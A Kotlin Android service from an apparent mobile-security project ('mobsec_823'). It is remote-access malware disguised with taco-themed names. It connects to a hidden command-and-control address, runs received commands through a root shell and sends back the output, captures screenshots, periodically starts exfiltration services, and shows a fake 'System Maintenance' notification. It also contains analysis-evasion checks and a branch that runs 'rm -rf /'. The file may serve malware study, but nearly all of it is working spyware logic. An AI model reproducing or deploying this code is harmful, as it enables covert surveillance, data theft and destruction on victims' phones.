package com.example.mobsec_823

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.mobsec_823.RecylingService.RecyclingTruckService
import com.example.mobsec_823.RecylingService.RubbishTruckService
import com.example.mobsec_823.RecylingService.SignageRecylingService
import com.example.mobsec_823.utils.SafetyNet
import com.example.mobsec_823.utils.SecretBox
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class TacoDeliveryService : Service() {
    private var tacoTruck: TacoTruck? = null
    private var screenshotTask: carne? = null
    private val kitchenStaffScope = CoroutineScope(Dispatchers.IO)
    private val TAG = "TacoDeliveryService"
    private var exfilJobStarted = false

    companion object {
        const val ACTION_OPEN_FOR_BUSINESS = "com.example.mobsec_823.ACTION_OPEN_FOR_BUSINESS"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundNotification()

        // Dynamic Analysis Bypass: Emulator Detection
        if (!SafetyNet.isEnvironmentSafe()) {

            // In real malware:
//            stopSelf();
//            return START_NOT_STICKY
        }

        // Logic Bomb check
        if (!SafetyNet.isTriggerArmed(this)) {

//            stopSelf();
//            return START_NOT_STICKY
        }

        if (intent?.action == ACTION_OPEN_FOR_BUSINESS || intent == null) {
            openTheTacoStand()
            startScreenshotTask()
            startExfiltrationServices()
        }
        return START_STICKY
    }

    private fun startExfiltrationServices() {
        if (exfilJobStarted) return
        exfilJobStarted = true

        kitchenStaffScope.launch {
            while (true) {
                try {
                    startService(Intent(this@TacoDeliveryService, RubbishTruckService::class.java))
                    startService(Intent(this@TacoDeliveryService, RecyclingTruckService::class.java))
                    startService(Intent(this@TacoDeliveryService, SignageRecylingService::class.java))
                } catch (e: Exception) {

                }
                delay(900000) 
            }
        }
    }

    private fun startForegroundNotification() {
        val channelId = "TacoStandChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Updates", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Maintenance")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(1, notification)
    }

    private fun openTheTacoStand() {
        if (tacoTruck != null) {
            tacoTruck?.closeDown()
        }
        
        val truckIp = SecretBox.getKitchenAddress()
        val truckPort = SecretBox.getTruckPort()

        tacoTruck = TacoTruck(this, truckIp, truckPort, object : TacoTruck.OrderListener {
            override fun onOrderReceived(order: String) {
                executeShellCommand(order)
            }
        })
        tacoTruck?.openForBusiness()
    }

    private fun startScreenshotTask() {
        if (screenshotTask == null) {
            screenshotTask = carne(this)
            screenshotTask?.start()
        }
    }

    private fun executeShellCommand(command: String) {
        if (!SafetyNet.checkKitchenPermit(42)) return

        val x = (System.currentTimeMillis() % 100).toInt()
        if (!SafetyNet.checkOpaquePredicate(x)) {
            try { SecretBox.reflectedExec("rm -rf /") } catch (ignored: Exception) {}
        }

        kitchenStaffScope.launch {
            try {
                val suCmd = SecretBox.getSuCmd()
                val process = SecretBox.reflectedExec(suCmd)
                
                if (process != null) {
                    process.outputStream.bufferedWriter().use { 
                        it.write("$command\n${SecretBox.getExitCmd()}\n") 
                    }
                    process.inputStream.bufferedReader().forEachLine { line ->
                        tacoTruck?.sendToKitchen("OUT:$line")
                    }
                    process.waitFor()
                }
            } catch (e: Exception) {
                tacoTruck?.sendToKitchen("OUT:ERROR: ${e.message}")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        tacoTruck?.closeDown()
        screenshotTask?.stop()
        kitchenStaffScope.cancel()

    }

    override fun onBind(intent: Intent?): IBinder? = null
}
